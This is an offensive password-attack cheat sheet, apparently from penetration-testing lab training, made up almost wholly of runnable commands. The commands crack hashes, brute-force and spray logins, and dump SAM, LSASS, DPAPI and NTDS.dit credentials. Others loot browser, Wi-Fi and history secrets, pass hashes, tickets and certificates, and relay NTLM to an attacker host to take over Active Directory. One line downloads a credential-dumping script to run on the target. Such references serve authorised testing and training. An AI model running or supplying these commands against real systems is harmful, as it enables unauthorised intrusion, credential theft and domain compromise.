# Passwords Cheat Sheet

## Cracking Passwords and Create Wordlists

### John The Ripper

**Crack Options**
````
$ john --single passwd
$ john --wordlist=<wordlist_file> <hash_file>
$ john --incremental <hash_file>
````
**Identify Hash Formats**
````
$ hashid -j <hash>
````

### Hashcat

**Crack Options**
````
$ hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
````
**Hash Types**
````
$ hashcat --help
$ hashid -m '<hash>'
````
**Dictionary attack**
````
$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
--------------------------------------------------------------------------------------
- With Rules -
/usr/share/hashcat/rules
$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
````
**Mask**
````
$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
````

### Cracking Files and Archives**
````
$ <tool> <file_to_crack> > file.hash
$ locate *2john*

$ ssh2john.py SSH.private > ssh.hash
$ john --wordlist=rockyou.txt ssh.hash

$ office2john.py Protected.docx > protected-docx.hash
$ john --wordlist=rockyou.txt protected-docx.hash

$ pdf2john.py PDF.pdf > pdf.hash
$ john --wordlist=rockyou.txt pdf.hash

$ zip2john ZIP.zip > zip.hash
$ john --wordlist=rockyou.txt zip.hash

$ pwsafe2john pwsafe.psafe3 > pwsafedump
$ john --wordlist=rockyou.txt pwsafedump

$ keepass2john <file>.kdbx > keepass.hash
$ john --wordlist=rockyou.txt keepass.hash

$ bitlocker2john -i Backup.vhd > backup.hashes
$ grep "bitlocker\$0" backup.hashes > backup.hash
$ john --wordlist=rockyou.txt backup.hash
$ hashcat -a 0 -m 22100 backup.hash /usr/share/wordlists/rockyou.txt
````
**Mounting BitLocker-encrypted drives in Linux (or macOS)**
````
$ sudo apt-get install dislocker
$ sudo mkdir -p /media/bitlocker
$ sudo mkdir -p /media/bitlockermount
$ sudo losetup -f -P Backup.vhd
$ sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
$ cd /media/bitlockermount/
$ ls -la
$ sudo umount /media/bitlockermount
$ sudo umount /media/bitlocker
````

### Create custom Rules and Wordlists

**Create Custom Rule**
````
$ cat password.list
password
$ cat custom.rule
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
````
````
$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
````

**CeWL**
````
$ cewl https://domain -d 4 -m 6 --lowercase -w word.wordlist
````
**Create custom list of usernames**
````
https://github.com/urbanadventurer/username-anarchy
$ ./username-anarchy -i /home/ltnbob/names.txt 
$ ./username-anarchy <firt_name> <last_name>
````
**Tool: cupp**

## Remote Password Attacks

**NetExec**
````
$ netexec winrm <IP> -u user.list -p password.list
$ netexec <proto> <IP> -u user.list -p password.list
````
**Hydra**
````
$ hydra -L user.list -P password.list ssh://<IP>
$ hydra -L user.list -P password.list rdp://<IP>
$ hydra -L user.list -P password.list smb://<IP>
$ hydra -L user.list -P password.list ftp://<IP>
$ hydra -L user.list -P password.list -f IP smtp/pop3/imap
$ hydra -l username -P password.list <service>://<ip>
------------------------------------------------
- Metasploit SMB -
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > set rhosts <IP>
````
**Password Spraying**
````
$ netexec smb <IP>/24 -u <usernames.list> -p 'ChangeMe123!'
$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>' --local-auth --continue-on-success
$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>'  --continue-on-success
$ kerbrute passwordspray -d test.local domain_users.txt password123
````
**Enumerate Valid Users**
````
$ ./kerbrute_linux_amd64 userenum --dc <IP> --domain <domain> <list_of_users>
````
**Credential Stuffing**
````
- Default Creds -
https://github.com/ihebski/DefaultCreds-cheat-sheet
$ creds search linksys
$ creds search tomcat
$ creds search <service>
--------------------------------------------------------
- Network Traffic -
https://github.com/lgandx/PCredz
$ ./Pcredz -f demo.pcapng -t -v
````

## Windows Password Extraction

### SAM, SYSTEM, and SECURITY
````
> reg.exe save hklm\sam C:\sam.save
> reg.exe save hklm\system C:\system.save
> reg.exe save hklm\security C:\security.save
````
````
> C:\Windows\System32\config\SAM
> C:\Windows\System32\config\SECURITY
> C:\Windows\System32\config\SYSTEM
````
````
$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

Dumping local SAM hashes (uid:rid:lmhash:nthash)

$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
````
**DPAPI**
````
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
````

**Dump SAM, lsa, dpapi Remote**
````
$ netexec smb <IP> --local-auth -u <user> -p <password> --sam
$ netexec smb <IP> --local-auth -u <user> -p <password> --lsa
$ netexec smb <IP> -u <user> -p <password> --dpapi
$ netexec smb <IP> -u <user> -p <password> --dpapi cookies
$ netexec smb <IP> -u <user> -p <password> --dpapi nosystem
$ netexec smb <IP> -u <user> -p <password> --local-auth --dpapi nosystem
````

### LSASS

**Option 1**
````
Open Task Manager
Select the Processes tab
Find and right click the Local Security Authority Process
Select Create dump file
````
**Option 2**
````
> tasklist /svc (Find PID Lsass from cmd)
> Get-Process lsass (Find PID Lsass from powershell)
> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
````
**Pypykatz to extract credentials**
````
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
````
**Option 3**
````
- Mimikatz -
# privilege::debug
# sekurlsa::logonpasswords
# sekurlsa::logonPasswords full
# sekurlsa::credman
````

**Dump Remote lsass**
````
$ nxc smb <IP> -u <user> -p '<password>' -M lsassy
````

### Windows Credential Manager

- %UserProfile%\AppData\Local\Microsoft\Vault\
- %UserProfile%\AppData\Local\Microsoft\Credentials\
- %UserProfile%\AppData\Roaming\Microsoft\Vault\
- %ProgramData%\Microsoft\Vault\
- %SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\

**Enumerating credentials with cmdkey**
````
>cmdkey /list
Currently stored credentials:
    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
````
**We can use runas to impersonate the stored user like so:**
````
> runas /savecred /user:SRV01\mcharles cmd
````

### Active Directory and NTDS.dit

**Option 1**
````
C:\> vssadmin CREATE SHADOW /For=C:
C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
````
**Option 2**
````
> copy %SystemRoot%\NTDS\Ntds.dit <directory_to_copy>
````
**Extract Hashes**
````
$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
````
**Option 3 - Remote**
````
$ netexec smb <IP> -u <user> -p <password> -M ntdsutil
$ nxc smb <IP> -u <user> -p '<password>' --ntds
$ nxc smb <IP> -u <user> -p '<password>' --ntds --user Administrator (Dump a specific user only)
$ impacket-secretsdump <domain>/<user>:<password>@<ip_dc>
````

## Linux Password Extraction

**PASSWD File**
````
/etc/passwd
student:x:1000:1000:,,,:/home/student:/bin/bash
````
**Shadow File**
````
/etc/shadow
student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
````
**Opasswd**
````
$ sudo cat /etc/security/opasswd
````
**Crack linux Creds**
````
$ sudo cp /etc/passwd /tmp/passwd.bak 
$ sudo cp /etc/shadow /tmp/shadow.bak 
$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
````

## Credential Hunting

### Windows

**LaZagne**
````
> LaZagne.exe all
````
**BrowserCreds**
````
> .\SharpChrome.exe logins /unprotect
https://github.com/hakaioffsec/browservoyage
````
**SessionGopher**
````
> Import-Module .\SessionGopher.ps1
> Invoke-SessionGopher -Target <machine>
````
**Autologon**
````
> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
````
**findstr & Powershell**
````
> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
> findstr /SI /M "password" *.xml *.ini *.txt
> findstr /si password *.xml *.ini *.txt *.config
> findstr /spin "password" *.*
> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password (powershell)
> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore (powershell)
````
**Misc**
````
> gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
> gc (Get-PSReadLineOption).HistorySavePath
> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
````
**unattend.xml**

**StickyNotes**
````
Located at C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
Copy the plum.sqlite to our machine
Open with DB Browser for SQLite
---------------------------------------------------------------------------------------------------------------------
- Viewing Sticky Notes Data Using PowerShell -
> Set-ExecutionPolicy Bypass -Scope Process
> Import-Module .\PSSQLite.psd1
> $db = 'C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
````
**Wifi Passwords**
````
> netsh wlan show profile
> netsh wlan show profile <wifi_network> key=clear
````
**Snaffler**
````
c:\Users\Public>Snaffler.exe -s
````
**PowerHuntShares**
````
# Bypass execution policy restrictions
> Set-ExecutionPolicy -Scope Process Bypass
# Import module that exists in the current directory
> Import-Module .\PowerHuntShares.psm1
> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
````
**Netexec**
````
$ nxc smb <IP> -u <user> -p '<password>' --spider <share> --content --pattern "passw"
$ nxc smb <IP> -u '<user>' -p '<password>' --shares -M spider_plus -o DOWNLOAD_FLAG=True (Dwonload all files)
$ nxc smb <ip> -u user -p pass -M keepass_discover
$ nxc smb <ip> -u <user>  -p <password> -M putty
$ nxc smb <ip> -u <user>  -p <password> -M vnc
$ nxc smb <ip> -u <user>  -p <password> -M mremoteng
$ nxc smb <ip> -u username -p password -M notepad
$ nxc smb <ip> -u username -p password -M notepad++
````
**MANSPIDER**
````
https://github.com/blacklanternsecurity/MANSPIDER
$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <IP> -c 'passw' -u '<user>' -p '<password>'
````

### Linux

**Files**
````
$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
$ find / -name "*.kdbx" 2>/dev/null
$ find / \( -name "*.kdbx" -o -name "*.kdb" -o -iname "*keepass*" \) 2>/dev/null
$ find / -name "*.psafe3" 2>/dev/null
$ find / \( -name "*.kdbx" -o -name "*.kdb" -o -name "*.psafe3" -o -iname "*keepass*" -o -iname "*pwsafe*" -o -iname "*passwordsafe*" \) 2>/dev/null
$ grep 'DB_USER\|DB_PASSWORD' wp-config.php
$ find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
````
**Cronjobs**
````
$ cat /etc/crontab
$ ls -la /etc/cron.*/
````
**History Files**
````
$ cat /home/*/.bash*
$ cat .bash_history
````
**Log Files**
````
$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
````
**Memory and cache**
````
https://github.com/huntergregal/mimipenguin (Need Root Permissions)
$ sudo python3 mimipenguin.py
$ sudo python2.7 laZagne.py all
````
**Browser credentials**
````
https://github.com/unode/firefox_decrypt
$ python3.9 firefox_decrypt.py
````

## Windows Alternative Authentications

### Pass the Hash

**Mimikatz**
````
> mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe" exit
````
**Invoke-TheHash**
````
> Import-Module .\Invoke-TheHash.psd1
> Invoke-SMBExec -Target <IP> -Domain <domain> -Username <user> -Hash <hash> -Command "<command>" -Verbose
````
**Impacket**
````
impacket-psexec <user>@<ip> -hashes :<hash>
````
**Netexec**
````
# netexec smb <IP> -u <user> -d . -H <hash>
# netexec smb <IP> -u <user> -d . -H <hash> -x whoami
````
**Evil-Winrm**
````
$ evil-winrm -i <IP> -u <user> -H <hash>
````
**RDP**
````
Reg Key: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
$ xfreerdp  /v:<IP> /u:<user> /pth:<hash>
````

### Pass the Ticket

#### Windows

**Mimikatz**
````
- Export Tickets -
# privilege::debug
# sekurlsa::tickets /export

> dir *.kirbi
[0;6c680]-2-0-40e10000-plaintext@krbtgt-domain.kirbi
[0;3e7]-0-2-40a50000-DC01$@cifs-DC01.domain.kirbi
----------------------------------------------------------------------------------
- Pass the Ticket -
# privilege::debug
# kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
----------------------------------------------------------------------------------
- Pass The Ticket with PowerShell Remoting -
- Mimikatz -
# privilege::debug
# kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
> powershell
> Enter-PSSession -ComputerName DC01
````
**Rubeus**
````
- Export Tickets -
> Rubeus.exe dump /nowrap
----------------------------------------------------------------------------------
- Pass the Ticket -
> Rubeus.exe asktgt /domain:<domain> /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
Note that now it displays Ticket successfully imported!.
----------------------------------------------------------------------------------
Another way is to import the ticket into the current session using the .kirbi file from the disk.
> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
----------------------------------------------------------------------------------
Pass the Ticket - Base64 Format
Convert .kirbi to Base64 Format
> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
> Rubeus.exe ptt /ticket:<base64>
----------------------------------------------------------------------------------
- Pass The Ticket with PowerShell Remoting -
> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
> Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
> powershell
> Enter-PSSession -ComputerName DC01
````

#### Linux

**Identifying Linux and Active Directory integration**
````
- realm - Check if Linux machine is domain-joined -
$ realm list

In case realm is not available, we can also look for other tools used to integrate Linux with Active Directory such as sssd or winbind.

- PS - Check if Linux machine is domain-joined -
$ ps -ef | grep -i "winbind\|sssd"
````
**Finding KeyTab files**
````
$ find / -name *keytab* -ls 2>/dev/null
$ crontab -l
````
**Finding ccache files**
````
$ env | grep -i krb5

- Searching for ccache files in /tmp -
$ ls -la /tmp
````
**Listing KeyTab file information**
````
$ klist -k -t /opt/specialfiles/carlos.keytab
````
**Impersonating a user with a KeyTab**
````
$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
````
**KeyTab Extract**
````
- Extracting KeyTab hashes with KeyTabExtract -
$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
````
**Abusing KeyTab ccache**
````
- Importing the ccache file into our current session -
# export KRB5CCNAME=<ticket>
# klist
````
**Impacket**
````
$ impacket-wmiexec dc01 -k
````
**Get Ticket with Impacket**
````
$ impacket-getTGT <domain>/<user> -dc-ip <DC-IP> -hashes :<hash>
$ impacket-getTGT <domain>/<user> -dc-ip <DC-IP>
````
**Evil-WinRM**
````
$ sudo apt-get install krb5-user -y

$ cat /etc/krb5.conf
[libdefaults]
        default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = dc01.<domain>
    }

$ evil-winrm -i dc01 -r <domain>
````
**Misc**
````
- Convert ccache in kirbi or kirbi in ccache -
$ impacket-ticketConverter krb5cc_647401106_I8I133 <user>.kirbi
----------------------------------------------------------------------------------
- Linikatz -
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
````

### Pass the Key aka. OverPass the Hash

**Mimikaz**
````
- Extract Kerberos keys -
# privilege::debug
# sekurlsa::ekeys

Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash aka. Pass the Key

# privilege::debug
# sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<rc4_hmac_nt>
This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
````
**Rubeus**
````
> Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes256> /nowrap
````

### Pass the Certificate

**AD CS NTLM Relay Attack (ESC8)**
````
$ impacket-ntlmrelayx -t http://<IP-Server>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
$ python3 printerbug.py <domain>/<user>:"<password>"@<IP-Server> <IP-Attacker>
````
**Get Ticket with Certificate**
````
$ python3 gettgtpkinit.py -cert-pfx <cert-gotit>.pfx -dc-ip <IP-DC> '<domain>/<user-certificate>' <file>.ccache
$ export KRB5CCNAME=<file>.ccache
$ impacket-secretsdump -k -no-pass -dc-ip <IP-DC> -just-dc-user Administrator '<domain>/<user-certificate>'@<IP>
````
**Shadow Credentials (msDS-KeyCredentialLink)**
````
https://github.com/ShutdownRepo/pywhisker
$ pywhisker --dc-ip <IP-DC> -d <domain> -u <user-controlled> -p '<password>' --target <user-target> --action add
$ python3 gettgtpkinit.py -cert-pfx <cert-gen-pywhisker>.pfx -pfx-pass '<pywhisker-pass>' -dc-ip <IP-DC> '<domain>/<user-certificate>' <file>.ccache
$ export KRB5CCNAME=/tmp/jpinkman.ccache
````
**PasstheCert**
````
$ certipy cert -pfx user.pfx -nokey -out user.crt
$ certipy cert -pfx user.pfx -nocert -out user.key
````
````
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 (Create a computer via LDAPS)
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -computer-pass SheSellsSeaShellsOnTheSeaShore (Create a computer via LDAPS with custom name/password)
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -delegated-services cifs/SRV-MAIL.domain.local,ldap/SRV-MAIL.domain.local 
$ python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -port 389 -delegate-to DESKTOP-CKDRXFUX$ -delegate-from SRV-MAIL$ (Add a delegation right via StartTLS on port 389)
$ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -new-pass (Change a password of a user)
$ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -elevate (Elevate a user for DCSYNC)
$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 (Spawn an interactive LDAP shell)




